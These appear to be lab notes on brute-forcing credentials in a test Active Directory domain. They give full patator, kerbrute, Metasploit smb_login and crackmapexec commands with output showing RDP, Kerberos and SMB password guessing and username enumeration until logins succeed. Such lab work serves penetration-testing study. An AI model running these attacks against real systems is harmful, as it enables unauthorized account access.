
# Bruteforce

## Rdp Brute Force

brute force with less privilege

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ patator rdp_login host=192.168.200.110 user="testuser" password=FILE0 0=pword.txt          
	11:51:29 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.2 at 2021-08-19 11:51 EDT
	11:51:29 patator    INFO -                                                                              
	11:51:29 patator    INFO - code  size    time | candidate                          |   num | mesg
	11:51:29 patator    INFO - -----------------------------------------------------------------------------
	11:51:30 patator    INFO - 132   32     0.607 | admin                              |     1 | ERRCONNECT_AUTHENTICATION_FAILED
	11:51:30 patator    INFO - 132   32     0.609 | password                           |     2 | ERRCONNECT_AUTHENTICATION_FAILED
	11:51:30 patator    INFO - 132   32     0.622 | s3cr3t                             |     3 | ERRCONNECT_AUTHENTICATION_FAILED
	11:51:30 patator    INFO - 132   32     0.648 | 12345                              |     4 | ERRCONNECT_AUTHENTICATION_FAILED
	11:51:30 patator    INFO - 131   38     1.434 | Pass123!                           |     5 | ERRINFO_SERVER_INSUFFICIENT_PRIVILEGES
	11:51:31 patator    INFO - Hits/Done/Skip/Fail/Size: 5/5/0/0/5, Avg: 3 r/s, Time: 0h 0m 1s


Brute force with privilege account


	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ patator rdp_login host=192.168.200.110 user="administrator" password=FILE0 0=pword.txt
	11:51:16 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.2 at 2021-08-19 11:51 EDT
	11:51:17 patator    INFO -                                                                              
	11:51:17 patator    INFO - code  size    time | candidate                          |   num | mesg
	11:51:17 patator    INFO - -----------------------------------------------------------------------------
	11:51:17 patator    INFO - 132   32     0.639 | admin                              |     1 | ERRCONNECT_AUTHENTICATION_FAILED
	11:51:17 patator    INFO - 132   32     0.648 | password                           |     2 | ERRCONNECT_AUTHENTICATION_FAILED
	11:51:17 patator    INFO - 132   32     0.647 | s3cr3t                             |     3 | ERRCONNECT_AUTHENTICATION_FAILED
	11:51:17 patator    INFO - 132   32     0.653 | 12345                              |     4 | ERRCONNECT_AUTHENTICATION_FAILED
	11:51:18 patator    INFO - 0     2      1.566 | Pass123!                           |     5 | OK
	11:51:19 patator    INFO - Hits/Done/Skip/Fail/Size: 5/5/0/0/5, Avg: 2 r/s, Time: 0h 0m 2s




## Kerbrute

Brute force usernames from DC (There is no log for this scan)


	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ ./kerbrute userenum --dc valhalla.local -d valhalla.local /usr/share/wordlists/metasploit/unix_users.txt

		__             __               __     
	   / /_____  _____/ /_  _______  __/ /____ 
	  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
	 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
	/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

	Version: v1.0.3 (9dad6e1) - 08/19/21 - Ronnie Flathers @ropnop

	2021/08/19 10:47:44 >  Using KDC(s):
	2021/08/19 10:47:44 >   valhalla.local:88

	2021/08/19 10:47:44 >  [+] VALID USERNAME:       administrator@valhalla.local
	2021/08/19 10:47:44 >  Done! Tested 167 usernames (1 valid) in 0.065 seconds



Bruteforce password for single user (There is no log for this scan)

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ ./kerbrute bruteuser -d valhalla.local --dc valhalla.local 500.txt testuser   

		__             __               __     
	   / /_____  _____/ /_  _______  __/ /____ 
	  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
	 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
	/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

	Version: v1.0.3 (9dad6e1) - 08/19/21 - Ronnie Flathers @ropnop

	2021/08/19 10:46:17 >  Using KDC(s):
	2021/08/19 10:46:17 >   valhalla.local:88

	2021/08/19 10:46:18 >  [+] VALID LOGIN:  testuser@valhalla.local:Pass123!
	2021/08/19 10:46:18 >  Done! Tested 500 logins (1 successes) in 1.019 seconds


## Metasploit

	msf6 auxiliary(scanner/smb/smb_login) > set pass_file pword.txt
	pass_file => pword.txt
	msf6 auxiliary(scanner/smb/smb_login) > run

	[*] 192.168.200.100:445   - 192.168.200.100:445 - Starting SMB login bruteforce
	[-] 192.168.200.100:445   - 192.168.200.100:445 - Failed: 'valhalla.local\administrator:admin',
	[-] 192.168.200.100:445   - 192.168.200.100:445 - Failed: 'valhalla.local\administrator:password',
	[-] 192.168.200.100:445   - 192.168.200.100:445 - Failed: 'valhalla.local\administrator:s3cr3t',
	[-] 192.168.200.100:445   - 192.168.200.100:445 - Failed: 'valhalla.local\administrator:12345',
	[+] 192.168.200.100:445   - 192.168.200.100:445 - Success: 'valhalla.local\administrator:Pass123!' Administrator
	[*] valhalla.local:445    - Scanned 1 of 1 hosts (100% complete)
	[*] Auxiliary module execution completed
	
	
## Crackmapexec

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ crackmapexec smb 192.168.200.100 -u thor -p pword.txt -d valhalla.local          
	SMB         192.168.200.100 445    ODIN             [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:ODIN) (domain:valhalla.local) (signing:True) (SMBv1:True)
	SMB         192.168.200.100 445    ODIN             [-] valhalla.local\thor:admin STATUS_LOGON_FAILURE 
	SMB         192.168.200.100 445    ODIN             [-] valhalla.local\thor:password STATUS_LOGON_FAILURE 
	SMB         192.168.200.100 445    ODIN             [-] valhalla.local\thor:s3cr3t STATUS_LOGON_FAILURE 
	SMB         192.168.200.100 445    ODIN             [-] valhalla.local\thor:12345 STATUS_LOGON_FAILURE 
	SMB         192.168.200.100 445    ODIN             [+] valhalla.local\thor:Pass123!

